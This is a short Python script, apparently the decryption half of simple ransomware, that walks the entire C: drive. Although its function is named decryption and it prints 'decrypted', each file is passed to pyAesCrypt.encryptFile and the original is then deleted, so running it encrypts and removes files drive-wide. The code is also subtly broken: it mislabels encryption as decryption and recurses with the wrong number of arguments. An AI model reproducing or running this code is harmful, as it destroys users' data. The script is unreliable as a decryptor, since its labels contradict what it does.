import os
import pyAesCrypt


def decryption(file, password):
    # instant buffer
    buffer_size = 512 * 1024

    pyAesCrypt.encryptFile(str(file),
                           str(os.path.splitext(file)[0]),
                           password,
                           buffer_size)
    print("[file] '" + os.path.splitext(file)[0] + "' decrypted !")
    # delete original file
    os.remove(file)


def steps_on_dir(password):
    for root, dirs, files in os.walk("C:\\"):
        for name in os.scandir(root):
            path = os.path.join(root, name)

            if os.path.isfile(path):
                try:
                    decryption(path, password)
                except Exception as Ex:
                    print(Ex)
            else:
                steps_on_dir(root, password)


password = input('enter password: ')
steps_on_dir(password)
